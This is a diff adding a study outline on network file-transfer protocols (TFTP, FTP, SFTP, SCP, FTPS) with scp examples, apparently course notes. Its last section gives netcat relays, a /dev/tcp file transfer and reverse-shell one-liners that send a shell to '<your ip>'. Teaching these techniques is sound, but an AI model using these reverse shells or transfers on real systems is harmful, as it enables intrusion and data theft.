@@ -1,0 +1,86 @@
+ - Describe common methods for transferring data
+    - TFTP
+       - RFC 1350 Rev2
+       - UDP transport
+       - Extremely small and very simple communication
+       - No terminal communication()
+       - Insecure(no authentication or encryption)
+       - no directory services
+       - used often for technologies such as BOOTP and PXE
+    - FTP
+       - Active
+       - Passive
+       - RFC 959
+       - TCP transport
+       - uses multiple TCP connections
+       - control connection(21)/Data connection(20)
+       - Authentication through clear-text sign in (username and password)
+       - Insecure in default configuration
+    - SFTP
+       - TCP transport(TCP port 22)
+       - Uses symmetric and asymmetric encryption
+       - adds ftp like services to SSH
+       - Authentication through sign in(username and password) or with SSH key
+       - Interactive terminal access
+    - SCP
+       - TCP transport(TCP port 22)
+       - Uses symmetric and asymmetric enryption
+       - Authentication through sign in (username and password) or with an ssh key
+       - Non interactive
+       - Download a file from a remote directory to a local directory
+          - scp student@172.16.82.106:secretstuff.txt /home/student
+       - Upload a file to a remote directory from a local directory
+          - scp secretstuff.txt student@172.16.82.106:/home/student
+       - Copy a file froma remote host to a seperate remote host
+          - $ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+       - Syntax with Alternate SSHD
+          - Download a file from a remote directory to a local directory
+             - $ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
+          - Upload a file to a remote directory from a local directory
+             - $ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student
+       - Syntax through a tunnel
+          - Download a file froma remote directory to a local directory
+             - $ scp -P 1111 student@localhost:secretstuff.txt /home/student
+          - Upload a file to a remote directory from a local directory
+             - $ scp -P 1111 secretstuff.txt student@localhost:/home/student
+    - FTPS
+       - TCP transport (TCP port 443)
+       - Adds SSL/TLS encryption to FTP
+       - Authentication with username/password and/or PKI
+       - Interactive terminal access
+    
+    - Traffic Redirection using tools
+       - NETCAT
+          - Can be used for the following
+             - Inbound and outbound connections TCP/UDP, to or from any ports
+             - Troublehooting network connections
+             - sending/receiving data (insecurly)
+          - NETCAT: client to listener file transfer
+             - Client (sends file): nc 10.2.0.2 9001 < file.txt
+               Listener (receive file): nc -l -p 9001 > newfile.txt
+          - Relay demos
+             - On client Relay:
+                - mknod mypipe p
+                  nc -lp 3333 > mypipe | nc -lp 4444 < mypipe
+             - On listener 2(sends info)
+                - nc 10.10.0.40 3333 < outfile.txt
+             - On listener1(receives info)
+                - nc 10.10.0.40 4444 > infile.txt
+       - File transfer with /dev/tcp
+          - On the receiving box:
+             - nc -l -p 1111 > file.txt
+          - On the sneding box
+             - cat file.txt > /dev/tcp/10.2.0.2/1111
+          - This method is useful for a host that does not have NETCAT available
+       - Reverse shell using netcat
+          - When shelled into the remote host using -c:
+             - nc -c /bin/sh <your ip> <any unfiltered port>
+          - You could even pipe bash through nc
+             - /bin/sh | nc <your ip> <any unfiltered port>
+          - Then listen for the shell
+             - nc -l -p <same unfiltered port> -vvv
+          - You can also listen using the -e with NETCAT
+             - nc -l -p <any unfiltered port> -e /bin/bash
+             
+    
+       
